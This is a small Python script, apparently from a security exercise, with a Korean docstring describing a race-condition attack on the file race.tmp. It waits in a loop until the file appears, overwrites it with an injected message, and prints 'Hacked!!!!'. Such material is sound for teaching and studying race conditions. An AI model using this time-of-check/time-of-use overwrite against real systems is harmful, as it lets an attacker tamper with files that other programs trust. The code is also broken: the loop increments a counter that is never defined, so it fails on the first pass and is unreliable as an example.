import os
import sys

def main(message: str):
    """
    Race Condition을 통해 race.tmp파일 내용을 변경하는 함수
    Args:
        message(str): 변경할 내용
    """
    run = True    
    while run:
        cnt += 1
        if os.path.exists("./race.tmp"):
            with open("race.tmp", "w", encoding = "UTF-8") as tmp_f:
                tmp_f.write(message)
            print("Hacked!!!!")

            run = False

if __name__ == "__main__":
    main("Race Condition!!!!")